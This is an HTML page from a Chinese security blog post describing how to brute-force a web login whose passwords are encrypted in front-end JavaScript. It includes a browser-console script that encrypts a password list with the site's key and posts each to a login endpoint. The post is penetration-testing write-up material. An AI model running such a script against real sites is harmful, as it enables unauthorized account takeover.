@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#33363b">
+    <meta name="msapplication-TileColor" content="#33363b">
+    
+    
+    
+    
+    <meta name="keywords" content="Life, Hacker, Hexo">
+    
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="192x192" href="/favicons/android-chrome-192x192.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
+    
+    
+    <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#33363b">
+    
+    
+    <link rel="manifest" href="/favicons/site.webmanifest">
+    
+    
+    <meta name="msapplication-config" content="/favicons/browserconfig.xml">
+    
+    
+    <link rel="alternate" href="/atom.xml" title="Ka's Blog" type="application/atom+xml">
+    
+    
+    <link rel="shortcut icon" type="image/x-icon" href="/favicons/favicon.ico">
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/index.css">
+    
+    <link rel="stylesheet" type="text/css" href="/css/sidebar.css">
+    
+    
+<link rel="stylesheet" type="text/css" href="/css/page.css">
+<link rel="stylesheet" type="text/css" href="/css/post.css">
+
+    <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    <link rel="stylesheet" type="text/css" href="/css/atom-one-dark.css">
+    <link rel="stylesheet" type="text/css" href="/css/lightgallery.min.css">
+    <script type="text/javascript" src="/js/jquery.min.js"></script>
+    <script defer type="text/javascript" src="/js/util.js"></script>
+    <script defer type="text/javascript" src="/js/clipboard.min.js"></script>
+    <script defer type="text/javascript" src="/js/scrollspy.js"></script>
+    <script defer type="text/javascript" src="/js/fontawesome-all.min.js"></script>
+    <script defer type="text/javascript" src="/js/lightgallery.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-fullscreen.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-hash.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-pager.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-thumbnail.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-zoom.min.js"></script>
+    
+    <script defer src="/js/busuanzi.pure.mini.js"></script>
+    
+    
+    <script defer type="text/javascript" src="/js/search.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var searchPath = "search.xml";
+      if (searchPath.length === 0) {
+        searchPath = "search.xml";
+      }
+      var path = "/" + searchPath;
+      searchFunc(path, "search-input", "search-result");
+    });
+    </script>
+    
+    
+    <script defer type="text/javascript" src="/js/index.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var cb = null;
+      var els = $(".post figure.highlight");
+      if (els.length) {
+        // Enabled Hexo highlight line number.
+        $(els).each(function (i, e) {
+          $(e).before("<button class=\"copy button\">复制</button>");
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              // nextElementSibling is figure,highlight.
+              // And following is the sequence of Hexo's internal
+              // highlight layout with line number.
+              return trigger.nextElementSibling.firstChild.firstChild.firstChild.lastChild.firstChild.firstChild;
+          }
+        });
+      } else {
+        // Disabled Hexo highlight line number.
+        els = $(".post pre code");
+        $(els).each(function (i, e) {
+          // Add button before pre, not code.
+          $(e).parent().before("<button class=\"copy button\">复制</button>");
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              // nextElementSibling is figure,highlight.
+              // And following is the sequence of Hexo's internal
+              // highlight layout without line number.
+              return trigger.nextElementSibling.firstChild;
+          }
+        });
+      }
+      cb.on("success", function (e) {
+        e.clearSelection();
+        var trigger = e.trigger;
+        // Change button text as a user tip.
+        trigger.innerHTML = "已复制";
+        $(trigger).addClass("copied");
+        // Change button text back;
+        setTimeout(function () {
+          trigger.innerHTML = "复制";
+          $(trigger).removeClass("copied");
+        }, 1500);
+      });
+    });
+    </script>
+    
+    <script defer type="text/javascript" src="/js/custom.js"></script>
+    <title>console中爆破数据加密传输的思路 | Ka's Blog</title>
+  </head>
+  <body itemscope itemtype="http://schema.org/WebPage" lang="zh_CN" data-spy="scroll" data-target=".list-group">
+    
+<header id="header" class="header" style="background: #33363b;">
+  <div class="container">
+    <div class="header-container">
+      <div class="header-title">
+        <h1 class="title"><a href="/">Ka's Blog</a></h1>
+        <h2 class="subtitle"></h2>
+      </div>
+      
+      <div class="logo">
+        <img src="/images/logo.png" alt="logo">
+      </div>
+      
+    </div>
+    <nav id="nav" class="nav">
+      <a id="nav-toggle" class="nav-toggle" aria-hidden="true"><i class="fas fa-bars" aria-label="切换导航栏"></i></a>
+      <ul id="menu" role="menubar" aria-hidden="false">
+        
+        <li role="menuitem"><a href="/"><i class="fas fa-home"></i><span class="menu-text">首页</span></a></li>
+        
+        <li role="menuitem"><a href="/archives/"><i class="fas fa-archive"></i><span class="menu-text">归档</span></a></li>
+        
+        <li role="menuitem"><a href="/about/"><i class="fas fa-archive"></i><span class="menu-text">关于</span></a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <main id="main" class="main">
+      <div class="container">
+        <div class="main-container">
+          <div class="content">
+            
+<div id="post" class="page">
+  
+  <article class="article post card" itemscope itemtype="http://schema.org/Article">
+    <div class="post-block">
+      <link itemprop="mainEntityOfPage" href="https://www.3cac.com/2018/08/12/console中爆破数据加密传输的思路/">
+      <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+       <meta itemprop="name" content="Ka">
+       <meta itemprop="description" content>
+       <meta itemprop="image" content="/images/ava.png">
+      </span>
+      <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+       <meta itemprop="name" content="Ka's Blog">
+      </span>
+    </div>
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">console中爆破数据加密传输的思路</h1>
+      <div class="post-meta">
+        
+        <span class="post-date">
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2018-08-12T11:30:41+08:00">2018-08-12 11:30:41</time></span>
+        </span>
+        
+        
+        
+      </div>
+    </header>
+    <main class="post-main" itemprop="articleBody">
+      <h1 id="console中爆破数据加密传输的思路"><a href="#console中爆破数据加密传输的思路" class="headerlink" title="console中爆破数据加密传输的思路"></a>console中爆破数据加密传输的思路</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>渗透测试过程中遇到web登录的时候，现在很多场景账号密码都是经过js加密之后再请求发送（通过抓包可以看到加密信息）如图一burp抓到的包,request的post的登录包，很明显可以看到password参数的值是经过前端加密之后再进行传输的，遇到这种情况,普通发包的爆破脚本就很难爆破成功。</p>
+<p><img src="https://www.3cac.com/images/20170706/1.png" alt="1"></p>
+<h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>分析一波后发现，网站登录时会调用，XLEncryption.js中的encMe函数</p>
+<figure class="hljs highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function encMe(s, k)&#123;</span><br><span class="line">    return stringToHex(encryption(k,s,1,0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>打开chrome，在此处下断点。user输入admin,password输入123456</p>
+<figure class="hljs highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function encMe(s, k)&#123;//s = "123456", k = "CCMS-APP"传进的参数</span><br><span class="line">    return stringToHex(encryption(k,s,1,0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由此可知传入两个参数一个是，我们的password的值，还有一个是js加密用的key。</p>
+<figure class="hljs highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var myReturn = encMe("123456","CCMS-APP")</span><br><span class="line">console.log(myReturn)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.3cac.com/images/20170706/2.png" alt="1"></p>
+<h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><p>exp的基本思路，用ajax把列表里的password发送，根据返回的数据包来判定是否成功</p>
+<p>踩坑：</p>
+<p>Q:变量命名 不要用i 不要用i 不要用i  **肯定会重复 大家都喜欢用i </p>
+<p>A:选一个不常用变量</p>
+<p>Q:jquery ajax请求成功，返回了数据，但是不进success回调函数的问题。</p>
+<p>A:先要处理返回数据。eval转换成json对象。</p>
+<p>Q:在ajax中判断，无法输出想要的密码，每次输出的都是列表中最后一个元素</p>
+<p>A:传参数时传入，两个参数如下面的代码中的function shepi(payload,myperson)</p>
+<figure class="hljs highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">	var testpass = ["root", "root123", "admin123", "admin666"];</span><br><span class="line">for(var init=0;init<span class="tag">&lt;<span class="name">testpass.length;init++)&#123;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">var</span> <span class="attr">myperson</span> = <span class="string">testpass[init];</span></span></span><br><span class="line"><span class="tag">	<span class="attr">window.test</span> = <span class="string">myperson</span></span></span><br><span class="line"><span class="tag">	<span class="attr">payload</span> = <span class="string">encMe(myperson,</span>"<span class="attr">CCMS-APP</span>");</span></span><br><span class="line"><span class="tag">	<span class="attr">shepi</span>(<span class="attr">payload</span>,<span class="attr">myperson</span>);</span></span><br><span class="line"><span class="tag">&#125;</span></span><br><span class="line"><span class="tag"><span class="attr">function</span> <span class="attr">shepi</span>(<span class="attr">payload</span>,<span class="attr">myperson</span>)&#123;</span></span><br><span class="line"><span class="tag">	$<span class="attr">.ajax</span>(&#123;</span></span><br><span class="line"><span class="tag">		<span class="attr">url</span> <span class="attr">:</span> "<span class="attr">http:</span>//*****/<span class="attr">Login</span>/<span class="attr">login.do</span>",</span></span><br><span class="line"><span class="tag">		<span class="attr">type</span> <span class="attr">:</span> "<span class="attr">POST</span>",</span></span><br><span class="line"><span class="tag">		<span class="attr">data</span> <span class="attr">:</span> &#123;</span></span><br><span class="line"><span class="tag">			<span class="attr">user:</span>"<span class="attr">bf9198e1396f8c3cf5d1914306c0c9c7</span>",</span></span><br><span class="line"><span class="tag">			<span class="attr">password</span> <span class="attr">:</span> <span class="attr">payload</span>,</span></span><br><span class="line"><span class="tag">			<span class="attr">openid</span> <span class="attr">:</span> ""</span></span><br><span class="line"><span class="tag">		&#125;,</span></span><br><span class="line"><span class="tag">		<span class="attr">async:</span> "<span class="attr">false</span>",</span></span><br><span class="line"><span class="tag">		<span class="attr">success</span> <span class="attr">:</span> <span class="attr">function</span>(<span class="attr">data</span>)&#123;</span></span><br><span class="line"><span class="tag">			<span class="attr">var</span> <span class="attr">data</span> = <span class="string">eval(</span>'(' + <span class="attr">data</span> + ')');</span></span><br><span class="line"><span class="tag">			<span class="attr">if</span>(<span class="attr">data.errorCode</span> != <span class="string">-1)&#123;</span></span></span><br><span class="line"><span class="tag">				<span class="attr">console.log</span>(<span class="attr">myperson</span>)</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">			&#125;<span class="attr">else</span>&#123;</span></span><br><span class="line"><span class="tag">			&#125;</span></span><br><span class="line"><span class="tag">		&#125;</span></span><br><span class="line"><span class="tag">	&#125;)</span></span><br><span class="line"><span class="tag">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.3cac.com/images/20170706/aa.png" alt="aa"></p>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>可以直接在chrome console里面直接操作，不需要其他依赖。</p>
+<blockquote>
+<blockquote>
+<p>‘Author’: ‘ka’</p>
+</blockquote>
+</blockquote>
+
+    </main>
+    <footer class="post-footer">
+      
+    </footer>
+  </article>
+  
+  
+  <nav class="page-nav">
+    <div class="page-nav-next page-nav-item">
+      
+      <a href="/2018/07/03/github上搭建hexo加SSL/" rel="next" title="github上搭建hexo加SSL"><i class="fas fa-angle-left"></i><span class="nav-title">github上搭建hexo加SSL</span></a>
+      
+    </div>
+    <div class="page-nav-prev page-nav-item">
+      
+      <a href="/2019/01/02/漏洞危害与修复建议/" rel="prev" title="漏洞危害与修复建议"><span class="nav-title">漏洞危害与修复建议</span><i class="fas fa-angle-right"></i></a>
+      
+    </div>
+  </nav>
+  
+  
+</div>
+
+          </div>
+          
+          
+          
+<aside class="sidebar" id="sidebar" style="background: url(/images/background.png);">
+  
+  <div class="search">
+    <div class="form-group">
+      <i class="fas fa-search"></i><input type="search" id="search-input" name="q" results="0" placeholder="搜索" class="form-control">
+    </div>
+  </div>
+  <div class="search-result-box" id="search-result"></div>
+  
+  
+<div class="info sidebar-item" id="info">
+  
+  <img class="author-avatar" src="/images/ava.png" alt="Ka">
+  
+  <h1 class="author-name">Ka</h1>
+  <h2 class="author-description"></h2>
+  <div class="site-count">
+    
+    
+    
+    
+    <div class="archives-count count-block">
+      <div class="site-count-title">归档</div>
+      <div><a href="/archives/">5</a></div>
+    </div>
+    
+    
+    
+    
+  </div>
+  
+  <div class="rss">
+    <a class="rss-link button sidebar-item" href="/atom.xml"><i class="fas fa-rss"></i>RSS</a>
+  </div>
+  
+</div>
+
+
+  <div class="sidebar-sticky">
+    
+    
+    
+    
+    
+    <hr>
+    <div class="post-toc sidebar-item" id="toc-div">
+      <div><i class="fas fa-list-ol"></i>文章目录</div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-1"><a class="list-group-item toc-link" href="#console中爆破数据加密传输的思路"><span class="toc-text">console中爆破数据加密传输的思路</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#0x01-分析"><span class="toc-text">0x01 分析</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#0x02-exp"><span class="toc-text">0x02 exp</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#0x03-总结"><span class="toc-text">0x03 总结</span></a></li></ol></li></ol></div>
+    </div>
+    
+    
+    
+    <hr>
+    <div class="social-link sidebar-item">
+      <div><i class="far fa-address-card"></i>社交链接<p></p></div>
+      <ul>
+        
+        <li><a href="https://github.com/" target="_blank">GitHub</a></li>
+        
+        <li><a href="https://weibo.com/" target="_blank">Weibo</a></li>
+        
+      </ul>
+    </div>
+    
+    
+    <hr>
+    <div class="blogroll sidebar-item">
+      <div><i class="fas fa-link"></i>友情链接</div>
+      <ul>
+        
+        <li><a href="https://lazydog.me/" target="_blank">lazydog</a></li>
+        
+        <li><a href="http://g4ba.xyz:1337/" target="_blank">gaba</a></li>
+        
+        <li><a href="http://www.cnblogs.com/icez/" target="_blank">星光</a></li>
+        
+        <li><a href="http://bt7k.com/" target="_blank">BT</a></li>
+        
+        <li><a href="http://www.jianfensec.com/" target="_blank">jianfen</a></li>
+        
+        <li><a href="http://blog.he4rt.me/" target="_blank">he4rt</a></li>
+        
+        <li><a href="https://www.hedysx.com/" target="_blank">Hedysx</a></li>
+        
+        <li><a href="https://www.antergone.com" target="_blank">Antergone</a></li>
+        
+        <li><a href="https://www.espandy.com/" target="_blank">SevenNinghtS</a></li>
+        
+        <li><a href="http://www.mixiyihao.com/" target="_blank">怀萍</a></li>
+        
+        <li><a href="https://www.untnt.com/" target="_blank">TNT</a></li>
+        
+      </ul>
+    </div>
+    
+  </div>
+</aside>
+
+
+          
+        </div>
+      </div>
+    </main>
+    
+<footer id="footer" class="footer" style="background: #33363b;">
+  <div class="container">
+    <div class="back-to-top">
+      <button id="back-to-top"><i class="fas fa-angle-double-up" aria-label="回到顶部"></i></button>
+    </div>
+    <div class="footer-container">
+      <div class="footer-left">
+        <div class="copyright">
+          <span class="author">Ka</span><span class="year"><i class="far fa-copyright"></i>2019</span>
+        </div>
+        
+        <div class="busuanzi">
+          <span id="busuanzi_container_site_pv"><i class="fas fa-eye" aria-label="站点点击量" aria-hidden="false"></i><span id="busuanzi_value_site_pv"></span></span><span id="busuanzi_container_site_uv"><i class="fas fa-user" aria-label="站点用户数" aria-hidden="false"></i><span id="busuanzi_value_site_uv"></span></span><span id="busuanzi_container_page_pv"><i class="far fa-file-alt"></i><span id="busuanzi_value_page_pv" aria-label="页面点击量" aria-hidden="false"></span></span>
+        </div>
+        
+      </div>
+      <div class="footer-right">
+        <div class="custom-info">
+          
+          Ka<script>var _hmt = _hmt || [];(function() {  var hm = document.createElement("script");  hm.src = "https://hm.baidu.com/hm.js?2aab18fa50214a86cd79e7e02b671a56";  var s = document.getElementsByTagName("script")[0];   s.parentNode.insertBefore(hm, s);})();</script>
+          
+        </div>
+        <div class="powered-by">
+          由 <a href="https://hexo.io/" target="_blank">Hexo</a> 强力驱动 | 主题 <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  </body>
+</html>
